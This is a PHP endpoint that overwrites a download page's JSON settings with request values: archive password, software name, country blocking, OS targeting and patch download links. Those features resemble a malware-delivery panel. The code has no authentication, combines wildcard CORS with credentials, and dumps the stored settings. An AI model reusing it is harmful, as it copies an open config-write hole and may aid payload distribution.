<?php

// CORS headers for actual requests
header("Access-Control-Allow-Origin: *"); // Replace with your actual domain
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");  // Methods allowed
header("Access-Control-Allow-Headers: Content-Type, Authorization"); // Headers allowed
header("Access-Control-Allow-Credentials: true"); // If you need to allow cookies

// Set content type to JSON
header('Content-Type: application/json');

// Read the raw input (which is in JSON format)
$input = file_get_contents('php://input');
// Decode the JSON payload into a PHP associative array
$input_data = json_decode($input, true);


// Load JSON settings file
$settingsFile = '../settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);

var_dump($settings);

// Get values
$PageStatus = $input_data['PageStatus'];
$Archiving_Enabled = $input_data['Enabled'];
$Archiving_Password = $input_data['Password'];
$Archiving_SoftwareName = $input_data['SoftwareName'];
$Archiving_ZIPName = $input_data['ZIPName'];
$GEO = $input_data['GEO'];
$BlockedGEO = explode(",", $input_data['BlockedGEO']);
$FileName = $input_data['FileName'];
$OS = $input_data['OS'];
$PatchDownloadLinks = explode("\n", $input_data['PatchDownloadLinks']);
$Version_Enabled = $input_data['Version'];
$AndroidLink = $input_data['AndroidLink'];
$iOSLink = $input_data['iOSLink'];
$MacOSLink = $input_data['MacOSLink'];


// Modify the settings
$settings->PageStatus = $PageStatus;
$settings->Archiving->Enabled = $Archiving_Enabled;
$settings->Archiving->Password = $Archiving_Password;
$settings->Archiving->SoftwareName = $Archiving_SoftwareName;
$settings->Archiving->ZIPName = $Archiving_ZIPName;
$settings->GEO = $GEO;
$settings->BlockedGEO = $BlockedGEO;
$settings->FileName = $FileName;
$settings->OS = $OS;
$settings->PatchDownloadLinks = $PatchDownloadLinks;
$settings->Version->Enabled = $Version_Enabled;
$settings->AndroidLink = $AndroidLink;
$settings->iOSLink = $iOSLink;
$settings->MacOSLink = $MacOSLink;


file_put_contents($settingsFile, json_encode($settings));


?>